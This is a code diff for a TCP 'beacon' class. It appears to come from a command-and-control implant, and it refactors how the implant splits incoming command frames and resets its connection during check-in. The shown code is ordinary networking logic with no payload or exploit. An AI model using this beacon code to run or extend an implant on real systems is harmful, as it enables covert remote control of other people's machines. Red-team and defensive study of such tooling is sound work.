@@ -23,26 +23,6 @@ BeaconTcp::~BeaconTcp()
 }
 
 
-int BeaconTcp::splitInPacket(const std::string& input, std::vector<std::string>& output) 
-{
-    std::string delimiter = "<TCP-666>";
-    size_t pos = 0;
-    size_t start = 0;
-
-    while ((pos = input.find(delimiter, start)) != std::string::npos) {
-        output.push_back(input.substr(start, pos - start));
-        start = pos + delimiter.length();
-    }
-
-    if (start < input.length()) 
-    {
-        output.push_back(input.substr(start));
-    }
-
-    return output.size();
-}
-
-
 void BeaconTcp::checkIn()
 {    
     int ret = m_client->init(m_ip, m_port);
@@ -52,22 +32,27 @@ void BeaconTcp::checkIn()
         std::string output;
         taskResultsToCmd(output);
 
-        output.append("<TCP-666>");
+        output.append(TcpFrameBuffer::delimiter());
 
         std::string input;
         int res = m_client->process(output, input);
 
-        if(res<0)
+        if(res<=0)
         {
             m_client->reset();
+            m_frames.reset();
         }
         else if(!input.empty())
         {
-            std::vector<std::string> trames;
-            splitInPacket(input, trames);
+            std::vector<std::string> frames;
+            if (!m_frames.append(input, frames))
+            {
+                m_client->reset();
+                return;
+            }
 
-            for(int i=0; i<trames.size(); i++)
-                cmdToTasks(trames[i]);
+            for(const auto& frame : frames)
+                cmdToTasks(frame);
         }
 
     }
